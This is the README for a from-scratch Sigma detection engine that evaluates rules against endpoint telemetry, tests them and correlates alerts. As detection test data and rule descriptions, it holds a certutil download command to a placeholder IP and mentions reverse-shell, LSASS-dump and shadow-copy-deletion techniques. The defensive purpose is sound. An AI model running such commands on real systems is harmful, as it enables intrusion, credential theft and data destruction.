# sigma-detection-engine (`sigmalite`)

A from-scratch [Sigma](https://github.com/SigmaHQ/sigma) rule engine for
detection engineering: it evaluates Sigma rules against JSON endpoint
telemetry, unit-tests every detection against known-bad and known-benign
events, maps the rule set's MITRE ATT&CK coverage, and groups individual
alerts into per-host incidents with a kill-chain view.

```
rules/*.yml ──▶ parse + compile ──▶ evaluate per event ──▶ alerts ──▶ correlate by host/time ──▶ incident report
                     │                                                         │
                     ├─▶ `sigmalite test`: embedded match / no_match cases      └─▶ multi-stage escalation
                     └─▶ `sigmalite coverage`: ATT&CK tactic/technique matrix
```

## Why this exists

The other blue-team tools in this repo hard-code their detection logic in
Python. Real SOCs don't work that way: detections are **content**, written
in a vendor-neutral format (Sigma), reviewed like code, tested in CI, and
measured against ATT&CK. This project shows that workflow end to end, and
shows I understand the format well enough to implement its semantics
myself rather than just calling `sigma-cli`.

## What it does

| Command | Purpose |
|---|---|
| `sigmalite scan` | Run rules over a JSON/JSONL event log, correlate alerts into incidents, print a Markdown or JSON report. Exit code `1` if any incident is at or above `--fail-on` (default `high`). |
| `sigmalite test` | Run every rule's embedded `tests.match` / `tests.no_match` events. Fails on a rule that stopped firing or started firing on benign activity. `--require-tests` also fails on untested rules. |
| `sigmalite coverage` | ATT&CK tactic coverage matrix (with gaps flagged) and technique list, as Markdown. |
| `sigmalite validate` | Parse and compile every rule; report the file and reason for any error. |

### Sigma support

Implemented directly from the specification, with no Sigma library:

- **Selections:** field maps (AND), value lists (OR), lists of maps (OR),
  keyword lists (search across every string value), `null` for missing fields.
- **Modifiers:** `contains`, `startswith`, `endswith`, `all`, `re`, `cidr`,
  `exists`, `windash`, `base64`, `gt`/`gte`/`lt`/`lte`. Unknown modifiers are
  a compile error, so a rule can't silently match nothing.
- **Conditions:** a recursive-descent parser for `and` / `or` / `not`,
  parentheses, `1 of sel_*`, `all of sel_*`, `1 of them` / `all of them`,
  and condition lists. Selections are evaluated lazily, so short-circuiting
  skips work on events that can't match.
- **Matching semantics:** case-insensitive with `*` / `?` wildcards (and
  `\*` escapes); `re` is case-sensitive unless the pattern says `(?i)`.
- **Logsource:** events can carry a `logsource` object; rules only run on
  events with a compatible product/category/service.
- **Field mapping:** `--field-map` translates Sigma field names to your log
  schema with dotted paths, so the same rules run on flat Sysmon events and
  nested ECS (Elastic) events. See `config/ecs_field_map.yml`.

Deliberately not supported: deprecated aggregation conditions
(`| count() > 5`) are rejected with a clear error instead of being
misread, and `base64offset` is not implemented.

### Detection-as-code test cases

Each rule can carry its own tests. Other Sigma tools ignore the extra key.

```yaml
tests:
  match:      # true positives: the rule MUST fire
    - Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.50/a.exe a.exe'
  no_match:   # benign look-alikes: the rule must NOT fire
    - Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil -hashfile ubuntu.iso SHA256'
```

The GitHub Actions workflow (`.github/workflows/sigma-detection-engine.yml`)
validates every rule, runs these cases with `--require-tests`, runs the
unit tests on Python 3.10 and 3.12, and writes the ATT&CK coverage matrix
to the job summary.

### Alert → incident correlation

Alerts are grouped by host, ordered by time, and split into a new incident
whenever two alerts are more than `--window` minutes apart (default 30).
Each incident lists its tactics in kill-chain order. An incident that spans
**three or more tactics** is escalated one severity level, because
multi-stage activity is much less likely to be a false positive than any
single alert.

## Shipped rule pack

Nine rules, each with true-positive and benign test events (31 cases in total):

| Rule | Level | ATT&CK |
|---|---|---|
| Office application spawning a shell / script host | high | T1566.001, T1204.002 |
| Encoded PowerShell command line (`-enc`, `/EncodedCommand`, dash variants) | high | T1059.001, T1027 |
| Certutil download / decode | high | T1105, T1140 |
| Rundll32 network connection to a public IP (`cidr` + `not` filter) | medium | T1218.011, T1071 |
| Domain and privilege discovery (`whoami /priv`, `net group /domain`) | low | T1033, T1069.002 |
| Registry Run key persistence via `reg.exe` (with vendor-path filter) | medium | T1547.001 |
| LSASS dump via comsvcs MiniDump or ProcDump | critical | T1003.001 |
| Volume Shadow Copy / backup catalog deletion | critical | T1490 |
| Linux reverse-shell one-liners (`/dev/tcp`, `nc -e`, python `pty`) | high | T1059.004 |

## Demo

`samples/attack_chain.jsonl` is synthetic Sysmon-style telemetry. It contains
a phishing-to-ransomware-precursor chain on `WS-FIN-07` (macro document →
encoded PowerShell → certutil download → rundll32 C2 → discovery → Run-key
persistence → LSASS dump → shadow-copy deletion), a reverse shell on a Linux
web server, and benign look-alikes on other hosts (`vssadmin list shadows`,
`certutil -hashfile`, a PowerShell script run with `-File`).

```bash
cd sigma-detection-engine
pip install -e ".[dev]"

sigmalite validate --rules rules
sigmalite test     --rules rules --require-tests
sigmalite coverage --rules rules
sigmalite scan     --rules rules --events samples/attack_chain.jsonl
sigmalite scan     --rules rules --events samples/attack_chain.jsonl --format json -o report.json

# Same rules, Elastic Common Schema input:
sigmalite scan --rules rules --events samples/ecs_events.json --field-map config/ecs_field_map.yml
```

Excerpt from the scan output. The full report is in `samples/example_report.md`:

```
Scanned 18 events with 9 rules → 11 alerts in 3 incident(s).

### 1. 🔴 CRITICAL · WS-FIN-07.corp.local — multi-stage, escalated
- Window: 2026-11-16 09:12:09 → 09:29:05 UTC
- Kill chain: Initial Access → Execution → Persistence → Defense Evasion →
  Credential Access → Discovery → Command and Control → Impact

### 2. 🟠 HIGH · web-01            (Linux reverse shell)
### 3. 🔵 LOW · WS-IT-01.corp.local (admin running whoami /groups, 2.5h later)
```

None of the five benign look-alike events produces an alert.

## Project layout

```
sigma-detection-engine/
├── sigmalite/
│   ├── condition.py   # tokenizer + recursive-descent parser for Sigma conditions
│   ├── matcher.py     # selection/modifier compiler, wildcard + field-path logic
│   ├── rule.py        # YAML loading, validation, Rule model, ATT&CK tag parsing
│   ├── engine.py      # event reader, logsource filtering, alert generation
│   ├── correlate.py   # host/time-window incident grouping + escalation
│   ├── attack.py      # ATT&CK tactic metadata + coverage report
│   ├── testing.py     # detection-as-code test runner
│   ├── report.py      # Markdown / JSON rendering
│   └── cli.py         # scan | test | coverage | validate
├── rules/             # Windows + Linux rule pack with embedded tests
├── config/            # field maps (ECS)
├── samples/           # synthetic telemetry + example report
└── tests/             # 78 pytest tests
```

## Running the tests

```bash
pip install -e ".[dev]"
pytest -q
```

## Possible extensions

- Sigma correlation rules (`event_count`, `temporal`) as a native layer on
  top of `correlate.py`.
- A backend that compiles rules to SQL or Elastic queries instead of
  evaluating them in Python.
- An EVTX reader (`python-evtx`) so raw Windows logs can be scanned without
  converting them to JSON first.
- LLM-assisted rule drafting from a threat report, with the generated rule
  only accepted once its own `tests` block passes.
